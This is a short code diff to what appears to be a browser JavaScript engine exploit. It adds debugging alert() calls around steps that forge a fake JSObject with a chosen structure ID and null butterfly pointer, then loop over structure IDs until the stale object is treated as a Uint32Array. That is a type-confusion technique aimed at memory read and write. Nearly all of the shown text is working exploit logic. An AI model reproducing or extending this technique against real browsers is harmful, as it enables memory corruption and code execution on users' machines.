@@ -186,12 +186,14 @@ function go_() {
 				stale[0] = fc;
 				fcp = bufs[i][k];
 				structID = 100;
+				alert("1");
 				stale[0] = {
 					'a': u2d(structID, 0x1172600), // the JSObject properties
 					'b': u2d(0, 0), // Butterfly ptr
 					'c': smsh, // var smsh = new Uint32Array(0x10)
 					'd': u2d(0x100, 0)
 				}
+				alert("2");
 				/*
 				stale[0] = {
 				    'a': u2d(structID, 0), // the JSObject properties
@@ -214,11 +216,13 @@ function go_() {
  					'd': u2d(0x100, 0)	// uint32_t m_length;
  				}
 				*/
-
+				
 				stale[1] = stale[0];
 				bufs[i][k] += 0x10;
-
+				alert("3");
+				
 				while(!(stale[0] instanceof Uint32Array)) {
+					alert("4");
 					structID++;
 					stale[1]['a'] = u2d(structID, 0);
 				}
